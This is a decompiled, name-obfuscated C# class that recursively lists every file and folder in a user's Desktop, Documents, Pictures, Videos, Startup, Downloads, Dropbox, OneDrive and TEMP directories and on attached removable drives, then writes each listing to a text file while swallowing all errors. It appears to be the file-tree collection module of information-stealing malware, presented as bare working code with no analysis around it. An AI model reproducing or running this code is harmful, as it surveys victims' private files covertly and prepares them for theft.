using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace ns5;

internal sealed class Class18
{
	private static List<string> list_0 = new List<string>
	{
		Environment.GetFolderPath(Environment.SpecialFolder.Desktop),
		Environment.GetFolderPath(Environment.SpecialFolder.Personal),
		Environment.GetFolderPath(Environment.SpecialFolder.MyPictures),
		Environment.GetFolderPath(Environment.SpecialFolder.MyVideos),
		Environment.GetFolderPath(Environment.SpecialFolder.Startup),
		Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads"),
		Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "Dropbox"),
		Path.Combine(Environment.GetEnvironmentVariable("USERPROFILE"), "OneDrive"),
		Environment.GetEnvironmentVariable("TEMP")
	};

	private static string smethod_0(string string_0, string string_1 = "\t", int int_0 = -1, int int_1 = 0)
	{
		if (!Directory.Exists(string_0))
		{
			return "Directory not exists";
		}
		DirectoryInfo directoryInfo = new DirectoryInfo(string_0);
		StringBuilder stringBuilder = new StringBuilder();
		stringBuilder.AppendLine(string.Concat(string.Concat(Enumerable.Repeat(string_1, int_1)), directoryInfo.Name, "\\"));
		if (int_0 == -1 || int_0 < int_1)
		{
			try
			{
				DirectoryInfo[] directories = directoryInfo.GetDirectories();
				foreach (DirectoryInfo directoryInfo2 in directories)
				{
					try
					{
						stringBuilder.Append(smethod_0(directoryInfo2.FullName, string_1, int_0, int_1 + 1));
					}
					catch (UnauthorizedAccessException)
					{
					}
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
		}
		try
		{
			FileInfo[] files = directoryInfo.GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				stringBuilder.AppendLine(string.Concat(string.Concat(Enumerable.Repeat(string_1, int_1 + 1)), fileInfo.Name));
			}
		}
		catch (UnauthorizedAccessException)
		{
		}
		return stringBuilder.ToString();
	}

	private static string smethod_1(string string_0)
	{
		string name = new DirectoryInfo(string_0).Name;
		if (name.Length == 3)
		{
			return "DRIVE-" + name.Replace(":\\", "");
		}
		return name;
	}

	public static void smethod_2(string string_0)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (driveInfo.DriveType == DriveType.Removable && driveInfo.IsReady)
			{
				list_0.Add(driveInfo.RootDirectory.FullName);
			}
		}
		foreach (string item in list_0)
		{
			try
			{
				string text = smethod_0(item);
				string text2 = smethod_1(item);
				if (!text.Contains("Directory not exists"))
				{
					File.WriteAllText(Path.Combine(string_0, text2 + ".txt"), text);
				}
			}
			catch
			{
			}
		}
	}
}
